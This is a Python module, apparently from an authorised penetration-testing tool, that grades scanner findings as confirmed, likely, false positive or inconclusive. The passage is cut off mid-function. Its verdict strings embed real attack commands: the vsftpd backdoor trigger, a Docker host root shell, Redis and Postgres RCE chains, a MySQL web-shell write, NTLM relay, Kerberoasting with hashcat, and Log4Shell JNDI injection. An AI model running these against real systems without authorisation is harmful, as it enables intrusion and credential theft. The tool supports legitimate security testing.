"""Proof-of-vulnerability engine: turn a flagged finding into a verdict.

Scanners flag a LOT (a dozen ActiveMQ / SMB / SeImpersonate items) and leave the
tester to decide which are real. This module reasons over the evidence recce
already collected - the exact version, the port state, the NSE detection result,
the on-target privilege state - and returns, per finding, one of:

    CONFIRMED       - the evidence positively proves it (a non-intrusive NSE
                      detection fired, signing really is off, the privilege really
                      is Enabled, we negotiated the weak protocol ourselves).
    FALSE POSITIVE  - the evidence disproves it (the build is patched, signing is
                      required, the NSE check says NOT VULNERABLE).
    LIKELY          - the preconditions hold but the final proof needs the PoC;
                      the exact safe command to finish proving is given.
    INCONCLUSIVE    - not enough collected yet; what to gather is given.

Every verdict carries the evidence it used, the preconditions, the EXACT next
command to finish proving (within ROE), and what a false positive would look
like. Nothing here exploits anything - it reasons and it tells you the safe check
to run.
"""

from __future__ import annotations

import re

from .models import Host, Port, Vuln
from .vulndb import _cmp                      # reuse the version comparator

CONFIRMED = "CONFIRMED"
LIKELY = "LIKELY"
FALSE_POSITIVE = "FALSE POSITIVE"
INCONCLUSIVE = "INCONCLUSIVE"

# Evidence phrasing that claims recce actively ACCESSED a service (authenticated /
# read with no credential / got an unauth reply) - true only for a live probe, so it
# must not stand on a version-db banner match. Deliberately excludes EOL/version-fact
# wording ("directly-observed build", "read the running version"), which is legit.
_LIVE_ACCESS_RE = re.compile(
    r"with no credential|no authentication and the server returned|"
    r"authenticated with|logged in with|read this kubernetes surface|"
    r"read the docker engine api", re.I)


# --- evidence helpers -----------------------------------------------------------

def _port_of(host: Host, vuln: Vuln) -> Port | None:
    for p in host.open_ports:
        if p.portid == vuln.port:
            return p
    return None


def _pv(host: Host, vuln: Vuln) -> tuple[str, str]:
    p = _port_of(host, vuln)
    return ((p.product or ""), (p.version or "")) if p else ("", "")


def _port_open(host: Host, portid: int) -> bool:
    return any(p.portid == portid for p in host.open_ports)


def _nse_vulnerable(vuln: Vuln) -> bool | None:
    """True if a non-intrusive NSE detection positively fired, False if it
    explicitly says NOT VULNERABLE, None if the finding isn't an NSE result."""
    blob = f"{vuln.state} {vuln.output}".upper()
    if "NOT VULNERABLE" in blob:
        return False
    if vuln.source == "nse" and "VULNERABLE" in blob:
        return True
    if "VULNERABLE" in (vuln.state or "").upper():
        return True
    return None


def _local(host: Host, pattern: str) -> str | None:
    """Return the first on-target (deploy/ingest) finding text matching pattern."""
    rx = re.compile(pattern, re.I)
    for f in getattr(host, "local_findings", []) or []:
        t = f.get("vector", "")
        if rx.search(t):
            return t
    return None


def _os_blob(host: Host) -> str:
    return f"{host.os_name} {host.os_family}".lower()


def _is_dc(host: Host) -> bool:
    if any("domain controller" in r.lower() or "directory" in r.lower()
           for r in getattr(host, "roles", []) or []):
        return True
    return any(p.portid in {88, 389, 636, 3268, 3269, 464} for p in host.open_ports)


# --- per-type verdict functions -------------------------------------------------

def _v_activemq(host, port, vuln):
    prod, ver = _pv(host, vuln)
    if not ver:
        return INCONCLUSIVE, ["No ActiveMQ version was detected on the port. Collect it: "
                              "nmap -sV -p61616,8161 <ip> (the OpenWire banner carries the build)."]
    # Fixed releases per maintained branch (CVE-2023-46604).
    fixed = {"5.15": "5.15.16", "5.16": "5.16.7", "5.17": "5.17.6", "5.18": "5.18.3"}
    branch = ".".join(ver.split(".")[:2])
    fx = fixed.get(branch)
    if fx and _cmp(ver, fx) >= 0:
        return FALSE_POSITIVE, [f"ActiveMQ {ver} is >= the fixed {fx} for the {branch}.x line -> PATCHED.",
                                "CVE-2023-46604 does not apply to a patched build - dismiss."]
    ev = [f"ActiveMQ {ver} is below the fixed release for its branch -> version-vulnerable to CVE-2023-46604."]
    if _port_open(host, 61616):
        ev.append("OpenWire port 61616 is OPEN -> the RCE transport is reachable.")
        return LIKELY, ev
    ev.append("OpenWire 61616 was NOT seen open (only the 8161 web console?). The RCE rides OpenWire, "
              "so confirm 61616 is reachable before trusting this - it may be firewalled.")
    return LIKELY, ev


def _v_smb_signing(host, port, vuln):
    sig = (host.smb_signing or "").lower()
    if sig == "not required":
        return CONFIRMED, ["SMB signing is 'not required' on this host (directly observed via "
                           "smb2-security-mode) -> an NTLM relay TO this host will succeed.",
                           "This is a verified state, not a version guess."]
    if sig == "required":
        return FALSE_POSITIVE, ["SMB signing is REQUIRED on this host -> relay to it is blocked. "
                                "Dismiss any 'relay to this host' finding."]
    return INCONCLUSIVE, ["Signing state not captured. Confirm: nmap --script smb2-security-mode -p445 <ip> "
                          "(or: nxc smb <ip> --gen-relay-list relays.txt)."]


def _v_ms17(host, port, vuln):
    nse = _nse_vulnerable(vuln)
    if nse is True:
        return CONFIRMED, ["nmap smb-vuln-ms17-010 reports VULNERABLE - a non-intrusive detection that "
                           "does not exploit the host -> CONFIRMED. EternalBlue applies."]
    if nse is False:
        return FALSE_POSITIVE, ["The smb-vuln-ms17-010 NSE check reports NOT VULNERABLE (patched) -> dismiss."]
    return LIKELY, ["This was inferred from OS/version, not a positive NSE hit. Prove it non-intrusively: "
                    "nmap --script smb-vuln-ms17-010 -p445 <ip>  (VULNERABLE = real, NOT VULNERABLE = FP)."]


def _v_smbv1(host, port, vuln):
    # recce's own SMBv1 NEGOTIATE was answered -> the legacy protocol is on. That
    # fact is directly observed (CONFIRMED); remote exploitability (MS17-010) is a
    # separate, patch-dependent question the finish command settles.
    return CONFIRMED, [
        "recce's SMBv1 NEGOTIATE was answered with a selected dialect - the deprecated "
        "SMBv1 protocol is enabled on this host (directly observed, not a banner guess).",
        "SMBv1-on is the MS17-010 / EternalBlue attack surface and permits NTLMv1 "
        "downgrade. Confirm remote exploitability non-intrusively: "
        "nmap --script smb-vuln-ms17-010 -p445 <ip> (a VULNERABLE result = pre-auth "
        "SYSTEM RCE now; NOT-VULNERABLE = legacy protocol on but patched - still a "
        "hardening failure to disable SMBv1)."]


def _v_smbghost(host, port, vuln):
    osn = f"{host.os_name} {host.os_family}".lower()
    # CVE-2020-0796 affects Windows 10 / Server builds 1903 & 1909 only.
    if re.search(r"1903|1909|18362|18363", osn):
        return LIKELY, ["OS build is in the SMBGhost range (1903/1909) and SMBv3.1.1 compression is the "
                        "default -> plausible.", "Prove non-intrusively with the public detection checker "
                        "(ollypwn/SMBGhost_scanner) - it reads the compression capability, no exploit."]
    if re.search(r"windows (7|8|2008|2012|2016|2019|2022)|1809|17763|20348", osn):
        return FALSE_POSITIVE, [f"OS ({host.os_name or host.os_family}) is outside the 1903/1909 SMBGhost "
                                "window -> not affected. Dismiss."]
    return INCONCLUSIVE, ["Exact Windows build unknown. Collect it (systeminfo / on-target enum), then only "
                          "1903/1909 are affected."]


def _v_potato(host, port, vuln):
    held = _local(host, r"seimpersonate|seassignprimarytoken")
    # Require an affirmative "Enabled" - NOT the bare substring, which also lives in
    # "not enabled" / "enabled: false" and would false-CONFIRM a disabled privilege.
    negated = held and re.search(
        r"\bdisabled\b|not\s+enabled|enabled\s*[:=]\s*(?:false|no|0|off)", held, re.I)
    if held and re.search(r"\benabled\b", held, re.I) and not negated:
        return CONFIRMED, [f"On-target enum confirms the privilege is ENABLED: {held}",
                           "GodPotato / PrintSpoofer / JuicyPotatoNG work on current patched Win10/11 & "
                           "Server 2016-2022 (they abuse SeImpersonate, not a patchable bug) -> real path to SYSTEM."]
    if held:
        return LIKELY, [f"The privilege is present but its enabled-state isn't confirmed: {held}",
                        "Confirm on-target: whoami /priv  -> SeImpersonatePrivilege must show 'Enabled'. "
                        "It's Enabled by default for service / IIS AppPool / MSSQL accounts."]
    # Only a remote inference (IIS/MSSQL likely holds it) - needs on-target proof.
    return INCONCLUSIVE, ["This is inferred remotely (a service that usually holds SeImpersonate). Prove it "
                          "on-target: get code exec as the service account, run  whoami /priv  and check "
                          "SeImpersonatePrivilege = Enabled. Use recce deploy/ingest to collect it."]


def _v_smb_writable(host, port, vuln):
    # recce STOR'd a marker to the share, listed it, and deleted it -> write proven.
    return CONFIRMED, [
        "recce proved this by writing a marker file to the share, listing it back, then "
        "deleting it (reversible) - the write actually landed, it is not inferred from "
        "an ACL.",
        "Escalate within ROE: drop a poisoned .SCF/.URL/.LNK and capture NetNTLM with "
        "Responder, or a web shell if the share backs a web root."]


def _v_nullsession(host, port, vuln):
    # Require an explicit ANONYMOUS/null marker - the old "shares"/"logged in" match
    # also fired on a CREDENTIALED smb-enum-shares listing (recce supports --creds),
    # falsely adjudicating an authenticated enum as an anonymous session. nmap prints
    # "account_used: <blank>" (or guest) precisely when the session was anonymous.
    out = vuln.output or ""
    anon = re.search(r"account_used:\s*(?:<blank>|''|\"\"|guest|anonymous)"
                     r"|null session|anonymous (?:login|access)|unauthenticated",
                     out, re.I)
    if _nse_vulnerable(vuln) or anon:
        return CONFIRMED, ["The check actually established an anonymous/null session (it enumerated without "
                           "credentials) -> CONFIRMED."]
    return LIKELY, ["Prove directly: nxc smb <ip> -u '' -p '' --shares   (or enum4linux-ng -A <ip>). "
                    "If it lists shares/users without creds, it's real; access denied = FP."]


def _v_k8s(host, port, vuln):
    # recce read a Kubernetes surface unauthenticated (kubelet /pods, apiserver LIST,
    # or etcd) -> the exposure is directly observed. The 'anonymous requests accepted'
    # (403 on the list) case is a config smell, not an exploited read -> LIKELY.
    blob = _blob(vuln)
    if "accepts anonymous requests" in blob:
        return LIKELY, [
            "The kube-apiserver processed an unauthenticated request (anonymous-auth "
            "is on) but RBAC refused the list (403). That's the precondition for the "
            "RBAC-misconfig/CVE class, not an exploited read by itself.",
            "Confirm what anonymous can reach: kubectl --insecure-skip-tls-verify "
            "--as=system:anonymous auth can-i --list."]
    return CONFIRMED, [
        "recce read this Kubernetes surface with NO credential (a kubelet /pods list, "
        "an anonymous apiserver resource LIST, or an etcd key read) - the exposure is "
        "directly observed.",
        "It is a direct path to cluster compromise (kubelet -> exec into pods -> "
        "service-account token; anonymous secrets / etcd -> every token and TLS key). "
        "recce only READ to prove it; escalate with the referenced tool in ROE.",
        "FP only if the endpoint actually required auth and the read was rejected - in "
        "which case recce would not have raised this."]


def _v_docker_api(host, port, vuln):
    # recce read the Docker API unauthenticated -> the exposure (and thus the root
    # container-escape path) is directly observed. CONFIRMED.
    return CONFIRMED, [
        "recce read the Docker Engine API (/version + /info) with no credential - the "
        "daemon is exposed unauthenticated (directly observed).",
        "The daemon runs as root, so this is remote root RCE on the host: "
        "docker -H <scheme>://<ip>:<port> run --rm -v /:/host -it alpine chroot /host sh "
        "gives an interactive root shell on the host (run within ROE). recce does not "
        "create a container itself - the successful unauthenticated read is the proof.",
        "FP only if the port actually enforces mutual-TLS (2376 --tlsverify) and the "
        "read was rejected - in which case recce would not have raised this."]


def _v_ldap(host, port, vuln):
    # recce performed the anonymous bind / anonymous read / cleartext bind itself, so
    # each is directly observed -> CONFIRMED, with the matching escalation.
    b = _blob(vuln)
    if "directory read" in b:
        return CONFIRMED, [
            "recce bound to LDAP anonymously and the naming context returned attributes "
            "- an unauthenticated client can read directory objects (directly observed).",
            "Enumerate the disclosed directory: ldapsearch -x -H ldap://<ip> -b <base> "
            "'(objectClass=user)' sAMAccountName servicePrincipalName description  "
            "(SPNs = kerberoast targets; descriptions frequently hold passwords).",
            "FP only if the read was actually denied - recce would not have raised this."]
    if "cleartext" in b:
        return CONFIRMED, [
            "recce completed a simple bind on cleartext 389 - a real credentialed bind "
            "here crosses the wire unencrypted, and the missing transport protection is "
            "an NTLM->LDAP relay surface (directly observed).",
            "Sniff a real bind (tcpdump 'tcp port 389'), or relay coerced auth: "
            "ntlmrelayx.py -t ldap://<ip> --escalate-user <user>  (within ROE).",
            "Require LDAPS/StartTLS + LDAP signing and channel binding."]
    return CONFIRMED, [
        "recce performed an anonymous simple bind (empty credentials) and the server "
        "returned success - it hands out an anonymous LDAP session (directly observed).",
        "Pivot to reading the directory: ldapsearch -x -H ldap://<ip> -b <base> "
        "'(objectClass=*)'; pair with nxc ldap <ip> -u '' -p '' --users.",
        "FP only if the bind was actually refused - recce would not have raised this."]


def _v_snmp(host, port, vuln):
    # recce guessed the community and read data back over the wire (or walked the
    # LanMgr user table), so the disclosure is directly observed -> CONFIRMED.
    b = _blob(vuln)
    if "user account" in b:
        return CONFIRMED, [
            "recce walked the LanManager user MIB (1.3.6.1.4.1.77.1.2.25) and the agent "
            "returned account names - an unauthenticated spray list (directly observed).",
            "Re-read them and pivot to a spray: snmp-check <ip> -c <community>; then "
            "nxc smb <ip> -u users.txt -p passwords.txt.",
            "FP only if the walk returned nothing - recce would not have raised this."]
    if "process / software" in b:
        return CONFIRMED, [
            "recce walked the host-resources MIB and the agent returned running "
            "processes / installed software unauthenticated (directly observed).",
            "snmpwalk -v2c -c <community> <ip> 1.3.6.1.2.1.25.6.3.1.2 (installed "
            "software); mine for AV/EDR and unpatched builds.",
            "FP only if the walk returned nothing - recce would not have raised this."]
    return CONFIRMED, [
        "recce guessed the community string and the agent answered with SNMP data "
        "unauthenticated (directly observed, not a banner guess).",
        "snmpwalk -v2c -c <community> <ip>  (or snmp-check <ip> -c <community>) to dump "
        "the full tree; a read-WRITE community (verify - recce did NOT send a SET) lets "
        "you push configuration.",
        "FP only if the community was actually refused - recce would not have raised this."]


def _v_mongodb(host, port, vuln):
    # recce spoke the wire protocol and listDatabases returned the database list with
    # no credential, so the no-auth exposure is directly observed -> CONFIRMED.
    b = _blob(vuln)
    if "sensitive data" in b or "pii" in b or "datamine" in b:
        return CONFIRMED, [
            "recce read the database, sampled documents, and found fields whose names "
            "denote secrets/PII - real data was returned (directly observed; the finding "
            "shows redacted samples).",
            "Dump the full documents within ROE: mongosh mongodb://<ip>:<port>/ --eval "
            "'db.getSiblingDB(\"<db>\").<coll>.find().limit(100)'; spray harvested creds.",
            "FP only if the fields hold non-sensitive data despite their names."]
    if "credentialed access" in b:
        return CONFIRMED, [
            "recce authenticated with a credential from the engagement (SCRAM) and read "
            "the databases (directly observed).",
            "mongosh 'mongodb://<u>:<pass>@<ip>:<port>/?authSource=admin' then enumerate "
            "/ dump within ROE.",
            "FP only if the credential no longer works."]
    if "end-of-life" in b or "legacy" in b:
        return CONFIRMED, [
            "recce read the running MongoDB version via buildInfo and it is past "
            "end-of-life (directly observed).",
            "mongosh mongodb://<ip>:<port>/ --eval 'db.version()' to re-read; check the "
            "release against the support matrix.",
            "FP only if a vendor backported fixes to this build in place."]
    return CONFIRMED, [
        "recce sent listDatabases over the MongoDB wire protocol with no authentication "
        "and the server returned the database list (directly observed).",
        "Dump it: mongosh mongodb://<ip>:<port>/ --eval 'db.adminCommand({listDatabases:1})' "
        "then mongodump --host <ip> --port <port> --out loot/  (read/write in ROE).",
        "FP only if the server actually required auth (it would have returned an error)."]


def _v_redis(host, port, vuln):
    # recce read INFO over RESP with no AUTH, so the no-auth exposure is directly
    # observed -> CONFIRMED.
    b = _blob(vuln)
    if "end-of-life" in b or "legacy" in b:
        return CONFIRMED, [
            "recce read the running Redis version via INFO and it predates the 6.0 ACL "
            "line / is end-of-life (directly observed).",
            "redis-cli -h <ip> -p <port> INFO server to re-read the version.",
            "FP only if a vendor backported fixes to this build in place."]
    return CONFIRMED, [
        "recce sent INFO over the Redis wire protocol with no authentication and the "
        "server returned its stats (directly observed).",
        "redis-cli -h <ip> -p <port> INFO ; KEYS '*'  then the CONFIG SET dir + "
        "dbfilename + SAVE file-write chain for RCE (within ROE).",
        "FP only if the server actually required auth (it would have returned -NOAUTH)."]


def _v_postgres(host, port, vuln):
    # recce spoke the v3 protocol itself - trust auth / a credentialed login / the
    # superuser COPY-FROM-PROGRAM capability / the sampled sensitive rows are all
    # directly observed -> CONFIRMED.
    b = _blob(vuln)
    if "copy from program" in b or "-> rce" in b or " rce " in b:
        confirmed = "rce confirmed" in b
        return CONFIRMED, [
            "recce read the connected role's privileges: it is a superuser (or member of "
            "pg_execute_server_program), so `COPY t FROM PROGRAM 'cmd'` executes OS "
            "commands as the postgres service account (directly observed"
            + ("; recce ran a benign `id` and it returned output - RCE CONFIRMED)."
               if confirmed else ")."),
            "psql '...' -c \"CREATE TEMP TABLE r(o text); COPY r FROM PROGRAM 'id'; "
            "TABLE r;\" (benign proof) then your ROE command; alt: CREATE FUNCTION "
            "LANGUAGE plpython3u/plperlu if that extension is installed.",
            "FP only if the role is NOT actually a superuser / lacks "
            "pg_execute_server_program (recce would not have raised this)."]
    if "sensitive data" in b or "pii" in b or "datamine" in b:
        return CONFIRMED, [
            "recce authenticated, read the schema, and sampled rows from columns whose "
            "names denote secrets/PII - real data was returned (directly observed; the "
            "finding shows redacted samples).",
            "Pull the full rows within ROE: psql '...' -c 'SELECT * FROM "
            "<schema>.<table> LIMIT 100'; spray any harvested connection strings.",
            "FP only if the columns hold non-sensitive data despite their names."]
    if "lateral pivot" in b or "dblink" in b or "postgres_fdw" in b:
        return CONFIRMED, [
            "recce read the extension catalog and found dblink/postgres_fdw reachable "
            "(installed, or available to a superuser), and/or configured foreign servers "
            "- the DB can open OUTBOUND connections to internal hosts (directly observed).",
            "Pivot within ROE: SELECT dblink_connect('h','host=<internal-db> user=postgres "
            "dbname=postgres'); then dblink('h','SELECT usename,passwd FROM pg_shadow'). "
            "Also SSRF arbitrary host:port and reach services unreachable from your box.",
            "FP only if the role can neither use nor create the extension and no foreign "
            "server is configured."]
    if "trust auth" in b:
        return CONFIRMED, [
            "recce completed a v3 startup for 'postgres' with NO password - the server "
            "answered AuthenticationOk (trust in pg_hba.conf), i.e. full unauthenticated "
            "database access (directly observed).",
            "psql 'host=<ip> port=<port> user=postgres' then \\l ; \\du ; SELECT "
            "usename,passwd FROM pg_shadow (recce already read these).",
            "FP only if the login was actually rejected (recce would not have raised this)."]
    return CONFIRMED, [
        "recce logged in with a credential from the engagement and the server returned a "
        "session - the account has real database access (directly observed).",
        "psql 'host=<ip> port=<port> user=<u>' and enumerate / dump within ROE.",
        "FP only if the credential no longer works."]


def _v_mysql(host, port, vuln):
    # recce spoke the MySQL protocol itself - the empty-password login / credentialed
    # login / FILE privilege / sampled sensitive rows are directly observed -> CONFIRMED.
    b = _blob(vuln)
    if "file privilege" in b or "load_file" in b or "outfile" in b:
        return CONFIRMED, [
            "recce read the connected account's grants and it HOLDS the FILE privilege "
            "(directly observed) - arbitrary file read (LOAD_FILE), file write (INTO "
            "OUTFILE), and UDF OS command exec as the mysql service account.",
            "mysql -e \"SELECT LOAD_FILE('/etc/passwd')\" (read); SELECT ... INTO "
            "OUTFILE '/var/www/shell.php' (write); or a lib_mysqludf_sys UDF into a "
            "writable @@plugin_dir for command exec - within ROE.",
            "FP only if secure_file_priv is NULL (file ops disabled) AND the plugin dir "
            "is not writable."]
    if "sensitive data" in b or "pii" in b:
        return CONFIRMED, [
            "recce authenticated, read information_schema, and sampled rows from columns "
            "whose names denote secrets/PII - real data was returned (directly observed; "
            "shown redacted).",
            "Pull the full rows within ROE: mysql -e 'SELECT * FROM <db>.<table> LIMIT "
            "100'; spray harvested connection strings.",
            "FP only if the columns hold non-sensitive data despite their names."]
    if "empty password" in b:
        return CONFIRMED, [
            "recce logged in with an EMPTY password over the MySQL protocol and the "
            "server returned OK (directly observed) - full unauthenticated access.",
            "mysql -h <ip> -u root ; SELECT user,authentication_string FROM mysql.user "
            "(recce already read these).",
            "FP only if the login was actually rejected (recce would not have raised this)."]
    return CONFIRMED, [
        "recce logged in with a credential from the engagement and the server returned a "
        "session - the account has real database access (directly observed).",
        "mysql -h <ip> -u <u> -p and enumerate / dump within ROE.",
        "FP only if the credential no longer works."]


def _v_elasticsearch(host, port, vuln):
    # recce GET /_cat/indices returned the index list with no credential -> CONFIRMED.
    b = _blob(vuln)
    if "end-of-life" in b or "legacy" in b:
        return CONFIRMED, [
            "recce read the running Elasticsearch version from the / banner and it is "
            "past end-of-life (directly observed).",
            "curl -s http://<ip>:<port>/ to re-read the version number.",
            "FP only if a vendor backported fixes to this build in place."]
    return CONFIRMED, [
        "recce GET /_cat/indices with no credential and the cluster returned the index "
        "list (directly observed).",
        "curl -s http://<ip>:<port>/_cat/indices then _search / elasticdump to pull "
        "documents (within ROE).",
        "FP only if security was actually enforced (it would have returned 401)."]


def _v_kerberos(host, port, vuln):
    b = _blob(vuln)
    if "username enumeration" in b:
        return CONFIRMED, [
            "recce sent pre-auth-less AS-REQs and the DC distinguished valid from "
            "invalid usernames (PREAUTH_REQUIRED vs PRINCIPAL_UNKNOWN) - directly "
            "observed, no logon attempted.",
            "impacket-GetNPUsers <domain>/ -no-pass -usersfile users.txt to re-confirm.",
            "FP only if the DC actually returned the same error for every name."]
    return CONFIRMED, [
        "recce requested an AS-REP with no pre-authentication and the DC returned one - "
        "the account has DONT_REQ_PREAUTH set and the crackable hash is captured "
        "(directly observed, no credential).",
        "hashcat -m 18200 asrep.hash rockyou.txt to recover the plaintext (within ROE).",
        "FP only if the account actually required pre-auth (no AS-REP would be issued)."]


def _v_rsync(host, port, vuln):
    b = _blob(vuln)
    if "enumerable" in b or "modules enumerable" in b:
        return CONFIRMED, [
            "recce completed the rsync handshake and the daemon returned its module "
            "list with no credential (directly observed).",
            "rsync rsync://<ip>:<port>/ to re-read the module inventory.",
            "FP only if the daemon actually required auth to list (it would not have "
            "returned the modules)."]
    return CONFIRMED, [
        "recce requested the module and the daemon answered @RSYNCD: OK - anonymous "
        "access with no credential (directly observed).",
        "rsync --list-only rsync://<ip>:<port>/<module>/ then rsync -av ... loot/ "
        "(within ROE).",
        "FP only if the module actually required auth (it would have returned "
        "AUTHREQD)."]


def _v_nfs(host, port, vuln):
    b = _blob(vuln)
    if "world-mountable" in b or "shared to any host" in b:
        return CONFIRMED, [
            "recce read the mountd export list and an export is shared with no host "
            "restriction / a wildcard (directly observed).",
            "showmount -e <ip> then mount -o vers=3 <ip>:<export> /mnt (within ROE); "
            "check for no_root_squash to escalate.",
            "FP only if the server actually restricts the export (the ACL would name "
            "specific hosts)."]
    if "rpc services enumerable" in b:
        return CONFIRMED, [
            "recce called the portmapper DUMP and it returned the registered RPC "
            "programs with no credential (directly observed).",
            "rpcinfo -p <ip> to re-read the RPC directory.",
            "FP only if rpcbind actually refused the query."]
    return CONFIRMED, [
        "recce called MOUNTPROC_EXPORT and mountd returned the export list with no "
        "credential (directly observed).",
        "showmount -e <ip> to re-read the exports.",
        "FP only if mountd actually required auth."]


def _v_ftp_backdoor(host, port, vuln):
    # A banner-matched trojaned/backdoored FTP build. The banner is strong evidence
    # but backdoor presence is only truly proven by triggering it, so LIKELY with the
    # exact non-destructive trigger.
    blob = _blob(vuln)
    if "vsftpd 2.3.4" in blob:
        return LIKELY, [
            "The banner is vsFTPd 2.3.4 - the trojaned release whose backdoor opens a "
            "root shell on tcp/6200 when a username ends in ':)'.",
            "Prove it (non-destructive): connect, send `USER recce:)`, `PASS x`, then "
            "`nc <ip> 6200` - a shell = CONFIRMED. A cleanly-rebuilt 2.3.4 (some distros "
            "patched in place) won't open 6200 -> FP.",
            "Metasploit: exploit/unix/ftp/vsftpd_234_backdoor (CHECK/run in ROE)."]
    if "mod_copy" in blob or "cve-2015-3306" in blob:
        return LIKELY, [
            "ProFTPD with mod_copy exposes SITE CPFR/CPTO to unauthenticated clients "
            "(CVE-2015-3306) -> arbitrary file copy and RCE.",
            "Prove: `SITE CPFR /etc/passwd` then `SITE CPTO /tmp/x` - a 250 on both = the "
            "module is reachable pre-auth. A build with mod_copy disabled/patched -> FP."]
    return LIKELY, [
        "A known-backdoored/RCE FTP build was matched by banner. Confirm with the "
        "referenced public module in ROE before relying on it."]


def _v_anon_ftp(host, port, vuln):
    if re.search(r"anonymous.*(allowed|permitted|succeeded|logged)|230 ", vuln.output or "", re.I):
        return CONFIRMED, ["Anonymous FTP login succeeded during the check -> CONFIRMED."]
    return LIKELY, ["Prove: ftp <ip>  then log in as 'anonymous' with a blank/any password. A 230 login = "
                    "real; 530 = FP."]


def _v_weak_tls(host, port, vuln):
    return CONFIRMED, ["recce negotiated the weak protocol/cipher itself during the TLS probe - this is a "
                       "direct observation, not a version inference, so it is real (a hardening issue, not "
                       "an RCE).", "Re-verify anytime: sslscan <ip>:<port>  or  openssl s_client -connect "
                       "<ip>:<port> -tls1 (a successful handshake confirms it)."]


def _v_printnightmare(host, port, vuln):
    if "windows" not in _os_blob(host) and host.os_family:
        return FALSE_POSITIVE, ["PrintNightmare is Windows-only; this host isn't Windows -> dismiss."]
    surface = _local(host, r"printnightmare surface|nowarningnoelevation")
    if surface:
        return LIKELY, [f"On-target enum confirms the LPE precondition: {surface}",
                        "Spooler is running and Point-and-Print allows non-admin driver installs -> the "
                        "CVE-2021-34527 surface is present. Exploitability is patch-dependent."]
    return INCONCLUSIVE, ["Flagged, but the Spooler state/config isn't confirmed on-target.",
                          "Confirm non-intrusively: rpcdump.py @<ip> | egrep 'MS-RPRN|MS-PAR' (the print RPC "
                          "interface). Present + unpatched -> real; interface absent / Spooler disabled -> FP."]


def _v_bluekeep(host, port, vuln):
    osn = _os_blob(host)
    rdp = _port_open(host, 3389)
    newer = re.search(r"windows (8|8\.1|10|11)|server 20(12|16|19|22)|windows 20(12|16|19|22)", osn)
    older = re.search(r"windows (xp|vista|7)\b|server 200[38]|2008 r2|windows 200[38]", osn)
    if newer and not older:
        return FALSE_POSITIVE, [f"OS ({host.os_name or host.os_family}) is Windows 8 / Server 2012 or newer "
                                "-> not affected by BlueKeep (CVE-2019-0708). Dismiss."]
    if older:
        ev = ["OS is in the BlueKeep pre-auth RCE range (XP/2003/Vista/7/2008/2008R2)."]
        ev.append("RDP (3389) is open -> reachable." if rdp
                  else "RDP 3389 not seen open - confirm it's reachable first.")
        return LIKELY, ev
    return INCONCLUSIVE, ["Exact Windows version unknown; only XP/2003/Vista/7/2008(R2) are affected. "
                          "Collect it (nmap -O / smb-os-discovery)."]


def _v_heartbleed(host, port, vuln):
    nse = _nse_vulnerable(vuln)
    if nse is True:
        return CONFIRMED, ["nmap ssl-heartbleed reports VULNERABLE - a detection that reads a small leaked "
                           "chunk (non-destructive) -> CONFIRMED."]
    if nse is False:
        return FALSE_POSITIVE, ["The ssl-heartbleed check reports NOT VULNERABLE (patched OpenSSL) -> dismiss."]
    prod, ver = _pv(host, vuln)
    if ver and "openssl" in prod.lower() and _cmp(ver, "1.0.1") >= 0 and _cmp(ver, "1.0.1g") < 0:
        return LIKELY, [f"OpenSSL {ver} is in the Heartbleed range (1.0.1-1.0.1f)."]
    return LIKELY, ["Prove non-intrusively: nmap --script ssl-heartbleed -p<port> <ip> (VULNERABLE = real, "
                    "NOT VULNERABLE = FP)."]


def _v_log4shell(host, port, vuln):
    return LIKELY, ["Log4Shell can't be proven from a banner - it depends on the app's bundled log4j version.",
                    "Prove non-intrusively with an out-of-band callback: inject ${jndi:ldap://<your-listener>/x} "
                    "into every input (User-Agent, X-Forwarded-For, form fields, search boxes) and watch a DNS/"
                    "LDAP listener you control (interactsh / your own DNS). A callback = CONFIRMED.",
                    "It's just a DNS lookup - no exploitation. No callback from any input -> not vulnerable / "
                    "egress-filtered."]


def _v_zerologon(host, port, vuln):
    if not _is_dc(host):
        return FALSE_POSITIVE, ["ZeroLogon (CVE-2020-1472) only affects Domain Controllers; this host isn't a "
                                "DC (no AD/LDAP/Kerberos ports, no DC role) -> dismiss."]
    return LIKELY, ["Host is a Domain Controller -> in scope for ZeroLogon.",
                    "Prove with the DETECTION-ONLY checker (it stops before changing anything): "
                    "zerologon_tester.py <DC-netbios-name> <ip>.",
                    "WARNING: the full exploit resets the DC machine-account password and can break AD - "
                    "detection-only unless you have a password-restore plan and explicit ROE."]


def _v_kerberoast(host, port, vuln):
    return CONFIRMED, ["The account carrying an SPN exists (the AD query returned it) -> the roasting TARGET "
                       "is real and confirmed.",
                       "Requesting its service ticket is a normal, non-destructive Kerberos operation; whether "
                       "it cracks depends on the password strength.",
                       "Prove end-to-end: impacket-GetUserSPNs <dom>/<user>:<pw> -request (or Rubeus kerberoast) "
                       "-> hashcat -m 13100 <hashes> <wordlist>."]


def _v_asrep(host, port, vuln):
    return CONFIRMED, ["The account has Kerberos pre-auth disabled (the AD query returned it) -> AS-REP "
                       "roastable, confirmed.",
                       "Requesting the AS-REP needs no credentials and is non-destructive.",
                       "Prove: impacket-GetNPUsers <dom>/ -usersfile <users> -no-pass -> hashcat -m 18200."]


def _v_web_exposure(host, port, vuln):
    # These findings come from OUR probe actually fetching the resource and matching
    # its signature - a direct observation, so they're CONFIRMED by definition.
    return CONFIRMED, ["recce fetched the resource itself and the response matched the signature "
                       "(the finding output shows the exact URL + HTTP status) -> directly confirmed.",
                       "Re-verify anytime with the curl in the finding, or the Kali command on the Web tab "
                       "(whatweb / nikto / nuclei). For .git, dump it: git-dumper <url>/.git ./loot."]


def _v_authsession(host, port, vuln):
    # recce submitted a harvested credential to the login form and got an authenticated
    # session back - directly observed -> CONFIRMED credential reuse / valid login.
    return CONFIRMED, [
        "recce logged into the web app's form with a credential harvested elsewhere in "
        "the engagement (.git/.env/DB/spec) and received an authenticated session - "
        "credential reuse confirmed (directly observed).",
        "Operate as that user within ROE: the authenticated surface (post-login pages, "
        "admin functions, APIs) was scanned with the session; escalate via any "
        "authenticated finding, and reuse the credential against SSH/SMB/other apps.",
        "FP only if the 'session' isn't actually authenticated (recce required a login "
        "form + a success signal, so this is unlikely)."]


def _v_debug(host, port, vuln):
    # recce fetched the debug page / debug endpoint itself, so the exposure is directly
    # observed -> CONFIRMED (RCE for the debugger/Ignition; disclosure otherwise).
    t = (vuln.title or "").lower()
    if "werkzeug" in t or "interactive debugger" in t:
        return CONFIRMED, [
            "recce observed the Werkzeug/Flask interactive debugger (debug=True in "
            "production) - its console executes arbitrary Python.",
            "Open the console at /console (or trigger a traceback); on old builds there "
            "is no PIN, otherwise brute/derive the PIN - then run any Python (RCE as the "
            "app user) within ROE.",
